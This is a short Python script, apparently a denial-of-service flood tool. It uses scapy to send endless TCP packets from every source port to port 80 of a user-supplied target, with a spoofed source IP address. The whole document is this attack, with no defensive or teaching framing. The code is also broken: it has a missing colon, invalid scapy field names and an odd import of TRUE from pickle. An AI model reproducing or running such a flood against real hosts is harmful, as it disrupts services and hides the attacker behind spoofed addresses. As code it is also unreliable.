from pickle import TRUE
from scapy.all import *

source_IP = input("Source IP Address: ")
target_IP = input("Target IP Address: ")

i = 1

while TRUE:
    for source_port in range(1, 65535)
        IP1 = IP(source_IP = source_IP, destination = target_IP)
        TCP1 = TCP(srcport = source_port, dstport = 80)
        pkt = IP1 / TCP1
        send(pkt, inter = .001)

        print ("paket send", i)
        i= i+1